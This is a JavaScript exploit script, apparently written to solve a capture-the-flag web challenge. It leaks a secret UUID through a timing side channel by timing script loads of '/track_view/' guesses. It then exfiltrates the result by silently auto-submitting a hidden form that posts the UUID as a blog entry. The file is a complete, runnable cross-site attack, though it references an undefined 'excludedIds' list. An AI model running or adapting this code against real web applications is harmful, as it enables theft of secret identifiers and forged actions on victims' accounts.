const threshold = 500;
const maxLength = 13;

const uuidChars = [];
for (let i = 48; i <= 57; i++) uuidChars.push(String.fromCharCode(i));
for (let i = 97; i <= 102; i++) uuidChars.push(String.fromCharCode(i));
uuidChars.push("-");

// excludedIds
const isExcludedStart = (char) => excludedIds.some(id => id.startsWith(char));

const checkChar = (testString, threshold) => {
  return new Promise((resolve) => {
    const script = document.createElement("script");
    const start  = performance.now();

    script.onload  = () => resolve(performance.now() - start > threshold);
    script.onerror = () => resolve(false);

    script.src = `/track_view/${testString}`;
    document.body.appendChild(script);
  });
};

function createSampleWebPBlob() {
    const webpBase64 = "UklGRmYAAABXRUJQVlA4IFoAAAAQBgCdASpkAGQAPm02mUmkIyKhIKgAgA2JaW7hc+lwH4AAAY2upvcReWAa6m9xF5YBrqb3EXlgGngA/v5Rff//kFywuuRr//8gP+QH/ID/+PimRpUqdCAAAAA=";
    const binary = atob(webpBase64);
    const buf = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        buf[i] = binary.charCodeAt(i);
    }
    return new Blob([buf], { type: "image/webp" });
}

function submitLeakedUUID(uuid) {
    const form = document.createElement("form");
    form.action = "/upload_blog_post";
    form.method = "POST";
    form.enctype = "multipart/form-data";
    form.style.display = "none";

    const titleInput = document.createElement("input");
    titleInput.type = "text";
    titleInput.name = "post_title";
    titleInput.value = "[FLAG UUID]";
    form.appendChild(titleInput);

    const bodyInput = document.createElement("input");
    bodyInput.type = "text";
    bodyInput.name = "post_body";
    bodyInput.value = uuid;
    form.appendChild(bodyInput);

    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.name = "file";
    form.appendChild(fileInput);

    document.body.appendChild(form);

    const dt = new DataTransfer();
    const blob = createSampleWebPBlob();
    dt.items.add(new File([blob], "sample.webp", { type: "image/webp" }));
    fileInput.files = dt.files;

    form.submit();
}

const leakUUID = async () => {
  let leaked = "";

  for (let i = 0; i < maxLength; i++) {
    for (const char of uuidChars) {
      if (i === 0 && isExcludedStart(char)) continue;

      const test  = leaked + char;
      const found = await checkChar(test, threshold);
      if (found) {
        leaked += char;
        break;
      }
    }
  }
  return leaked;
};

(async () => {
  try {
    const uuid = await leakUUID();
    console.log("Leaked UUID:", uuid);
    submitLeakedUUID(uuid);
  } catch (err) {
    console.error("Error leaking UUID:", err);
  }
})();
